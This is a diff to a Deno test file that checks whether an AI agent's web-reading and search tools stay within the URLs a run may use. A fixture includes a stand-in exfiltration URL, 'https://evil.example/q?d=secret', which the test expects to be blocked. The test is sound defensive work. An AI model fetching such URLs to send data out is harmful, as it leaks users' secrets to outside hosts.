@@ -28,6 +28,7 @@ import {
   type ToolHooks,
   unseenOps,
   URL_RE,
+  webToolDefinitions,
 } from "./tools.ts";
 import { tokensToSegments } from "./segments.ts";
 import runOps from "./testdata/run_ops.json" with { type: "json" };
@@ -37,6 +38,7 @@ import specs from "./testdata/specs.json" with { type: "json" };
 import markdown from "./testdata/markdown.json" with { type: "json" };
 import agent from "./testdata/agent.json" with { type: "json" };
 import toolsFixture from "./testdata/tools.json" with { type: "json" };
+import webCalls from "./testdata/web_calls.json" with { type: "json" };
 import { markdownSpecs } from "./lines.ts";
 import { fixture } from "../_testing/fixture.ts";
 
@@ -1353,6 +1355,8 @@ Deno.test("the tools' schemas and the calls they take are the client's (testdata
       (t as unknown as { name: string; parameters: unknown });
     schemas[f.name] = contract(f.parameters);
   }
+  const web: Record<string, unknown> = {};
+  for (const t of webToolDefinitions(true)) web[t.function.name] = contract(t.function.parameters);
   const para = '{"type":"paragraph","text":"a"}';
   const cases = [
     ["insert_blocks", `{"position":"end","blocks":[${para}]}`],
@@ -1375,7 +1379,7 @@ Deno.test("the tools' schemas and the calls they take are the client's (testdata
     const out = await session.call(tool, args);
     calls.push({ tool, args, ok: !(out.result as { error?: string }).error });
   }
-  await fixture("tools.json", { schemas, calls }, toolsFixture);
+  await fixture("tools.json", { schemas, web, calls }, toolsFixture);
 });
 
 // An embed's source past 30,000 characters is left out of what agents
@@ -1410,4 +1414,77 @@ Deno.test("a run stops at the most blocks it writes", async () => {
   const fits = await session.call("write_markdown", { markdown: "Last", position: "end" });
   assertEquals(fits.ops.length, 1);
   assertEquals(session.content.document.children!.length, sample().document.children!.length + 4001);
+});
+
+// The web's tools keep to the URLs the run may use, as the app's do (Go's
+// readWeb, searchWeb and checkURLs), which replay the calls of
+// testdata/web_calls.json alike: any page until the run reads the web,
+// then only one the person gave or the web led to; no URL the run made up
+// in what it writes; no source a query named; no address in a query once
+// it has read the web; and no web at all once it has read other pages.
+Deno.test("the web's tools keep to the URLs the run may use (testdata/web_calls.json)", async () => {
+  const request = "Find videos like https://given.example/r";
+  const search = {
+    answer: "See https://made.up/x",
+    sources: [{ url: "https://found.example/a", title: "A" }, { url: "https://evil.example/q?d=secret" }],
+  };
+  const page = (url: string) => ({
+    url,
+    title: "T",
+    text: "[next](https://found.example/b)",
+    links: ["https://found.example/b"],
+    truncated: false,
+  });
+  const card = (url: string) => ({ position: "end", blocks: [{ type: "link_preview", link: { url } }] });
+  const sequences: { armed: boolean; calls: [string, Record<string, unknown>][] }[] = [
+    {
+      armed: false,
+      calls: [
+        ["insert_blocks", card("https://made.up/before")],
+        ["read_web_page", { url: "https://any.example/" }],
+        ["read_web_page", { url: "https://other.example/" }],
+        ["read_web_page", { url: "https://found.example/b#part" }],
+        ["insert_blocks", card("https://found.example/b")],
+        ["insert_blocks", card("https://made.up/x")],
+        ["insert_blocks", card("https://given.example/r")],
+        ["write_markdown", { position: "end", markdown: "[more](https://made.up/y)" }],
+      ],
+    },
+    {
+      armed: false,
+      calls: [
+        ["web_search", { query: "evil.example/q?d=secret" }],
+        ["read_web_page", { url: "https://evil.example/q?d=secret" }],
+        ["read_web_page", { url: "https://made.up/x" }],
+        ["read_web_page", { url: "https://found.example/a" }],
+        ["web_search", { query: "see www.example.com" }],
+        ["web_search", { query: "AI videos this week" }],
+        ["list_pages", {}],
+        ["web_search", { query: "AI videos" }],
+        ["read_web_page", { url: "https://found.example/a" }],
+        ["insert_blocks", card("https://found.example/a")],
+      ],
+    },
+    { armed: true, calls: [["read_web_page", { url: "https://given.example/r" }], ["web_search", { query: "q" }]] },
+  ];
+  const made = [];
+  for (const seq of sequences) {
+    const session = new PageEditSession(sample(), {
+      ...hooks,
+      searchWeb: () => Promise.resolve(search),
+      readWebPage: (url) => Promise.resolve(page(url.split("#")[0])),
+    }, { canEdit: true, crossPage: true, request });
+    if (seq.armed) session.keepToGivenUrls();
+    const calls = [];
+    for (const [tool, args] of seq.calls) {
+      const out = await session.call(tool, args);
+      calls.push({ tool, args: JSON.stringify(args), ok: !(out.result as { error?: string }).error });
+    }
+    made.push({ armed: seq.armed, calls, kept_to_page: session.keptToPage });
+  }
+  assertEquals(made[0].calls.map((c) => c.ok), [true, true, false, true, true, false, true, false]);
+  assertEquals(made[1].calls.map((c) => c.ok), [true, false, false, true, false, true, true, false, false, false]);
+  assertEquals(made[2].calls.map((c) => c.ok), [false, false]);
+  assertEquals(made.map((m) => m.kept_to_page), [true, false, true]);
+  await fixture("web_calls.json", { request, search, sequences: made }, webCalls);
 });
